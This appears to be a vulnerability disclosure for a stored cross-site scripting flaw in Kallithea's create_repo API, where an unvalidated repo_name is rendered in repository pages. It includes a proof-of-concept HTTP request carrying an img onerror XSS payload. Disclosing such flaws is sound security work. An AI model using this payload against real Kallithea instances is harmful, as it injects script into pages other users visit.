This vulnerability allows a normal user to inject code into pages visible to other users/visitors of Kallithea (XSS).

`repo_name` inside `create_repo` API call is not properly validated and vulnerable to XSS attack.

XSS is visible after you click: "Repositories button" and also inside `_admin/repo_groups/new` (if you set different payload).

More info [here](https://kallithea-scm.org/security/20180606-szurek-4.html).

POC:

You need proper API key for this.

```
GET /_admin/api HTTP/1.1
Host: localhost:5000
Content-Length: 140
Connection: close

{"id":1,"api_key":"your_api_key","method":"create_repo","args":{"repo_name":"<img src=x onerror=alert(1)>/sth"}}
```
